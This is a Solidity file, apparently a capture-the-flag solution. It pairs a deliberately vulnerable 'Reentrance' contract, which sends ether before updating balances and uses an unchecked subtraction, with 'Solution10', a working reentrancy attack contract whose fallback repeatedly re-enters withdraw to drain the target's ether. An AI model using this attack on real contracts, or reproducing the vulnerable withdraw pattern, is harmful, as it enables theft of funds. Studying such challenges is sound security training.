// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Question 10
contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            unchecked {
                balances[msg.sender] -= _amount;
            }
        }
    }

    receive() external payable {}
}

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);

    function donate(address _to) external;

    function withdraw(uint256 _amount) external;
}

contract Solution10 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function _withdraw(uint256 _amount) internal {
        IReentrance(target).withdraw(_amount);
    }

    function targetETHBalance() public view returns (uint256) {
        return target.balance;
    }

    function targetBalanceOf(address _addr) internal view returns (uint256) {
        return IReentrance(target).balanceOf(_addr);
    }

    function hack() public payable {
        require(msg.value > 0, "Not allowed zero value");
        // Donate some value
        (bool res, ) = address(target).call{value: msg.value}(
            abi.encodeWithSelector(IReentrance.donate.selector, address(this))
        );
        assert(res);
        _withdraw(targetBalanceOf(address(this)));
        require(targetETHBalance() == 0, "Hack fails");
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {
        uint256 targetBal = targetETHBalance();
        uint256 thisBal = targetBalanceOf(address(this));
        uint256 amount = thisBal > targetBal ? targetBal : thisBal;
        if (targetBal > 0) {
            _withdraw(amount);
        }
    }
}